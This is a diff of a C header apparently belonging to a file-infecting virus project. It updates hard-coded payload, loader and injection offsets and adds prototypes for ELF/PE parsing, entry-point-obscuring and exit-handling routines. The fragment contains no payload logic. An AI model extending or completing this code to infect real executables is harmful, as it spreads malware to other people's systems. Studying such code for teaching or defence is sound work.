@@ -14,16 +14,18 @@
 # define MAGIC_VIRUS 0x4E505241
 # define SIGN_SIZE 0x28
 
+# define FT_MEMCPY_ADDR 0x11C0
 # define BUF_SIZE 0x20
-# define END_SIZE 0x1B + 0x5
-# define LOADER_SIZE 0x43
-# define PAYLOAD_SIZE 0x200d - 0x11A0 + 0x7
-# define MAIN_OFFSET 0x1df3 - 0x11A0
+# define END_SIZE 0x37
+# define LOADER_SIZE 0x4B
+# define PAYLOAD_SIZE 0x21e9 - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x1fb6 - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4
 
-# define OFFSET_1 0x18d6 - 0x11a0
-# define OFFSET_2 0x1a07 - 0x11a0
-# define OFFSET_3 0x1aff - 0x11a0
+# define OFFSET_1 0x1a20 - FT_MEMCPY_ADDR
+# define OFFSET_2 0x1b45 - FT_MEMCPY_ADDR
+# define OFFSET_3 0x1c84 - FT_MEMCPY_ADDR
+# define OFFSET_4 0x1fe6 - FT_MEMCPY_ADDR
 
 typedef struct		s_info
 {
@@ -57,9 +59,10 @@ void		write_filename_src(char *buf);
 void		write_sign(char *buf);
 
 /*			**** PARSING ****					*/
-int		find_text(t_info *info);
+int			find_text(t_info *info);
 void		epo_parsing(t_info *info);
 void		pe_parsing(t_info *info);
+void		patch_end(t_info *info, int32_t nb);
 
 /*			**** LIB HANDLERS	****			*/
 void		ft_memcpy(void *dest, void *src, size_t size);
@@ -70,5 +73,6 @@ ssize_t 	ft_syswrite(int fd, const void *buf, size_t count);
 void		*ft_sysmmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
 void		*ft_sysmunmap(void *addr, size_t len);
 int			ft_sysfstat(int fd, struct stat *buf); 
+void		handle_exit(void *addr);
 
 #endif
